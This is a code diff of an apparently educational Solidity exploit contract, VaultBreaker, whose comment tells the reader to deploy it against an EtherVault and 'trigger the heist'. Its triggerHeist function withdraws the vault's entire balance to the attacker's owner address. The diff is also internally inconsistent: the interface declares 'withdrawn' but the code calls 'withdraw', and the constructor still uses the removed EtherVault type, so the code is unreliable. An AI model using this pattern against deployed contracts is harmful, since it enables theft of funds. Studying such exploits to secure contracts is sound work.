@@ -9,17 +9,21 @@ pragma solidity ^0.8.20;
  * Author: Lucas Martin Calderon
  * Instructions: Deploy EtherVault, deposit Ether, then deploy VaultBreaker with EtherVault's address. Trigger the heist!
  */
-import "./EtherVault.sol";
+interface IEtherVault {
+    function withdrawn(address, uint) external payable;
+}
 
 contract VaultBreaker {
-    EtherVault public etherVault;
+    address public owner; 
+    IEtherVault public etherVault;
 
     constructor(EtherVault _etherVault) {
-        etherVault = EtherVault(_etherVault);
+        owner = payable(msg.sender);
+        etherVault = IEtherVault(_etherVault);
     }
 
     function triggerHeist() external {
-        etherVault.withdraw(payable(msg.sender), address(etherVault).balance);
+        etherVault.withdraw(owner, address(etherVault).balance);
     }
 
     receive() external payable {}
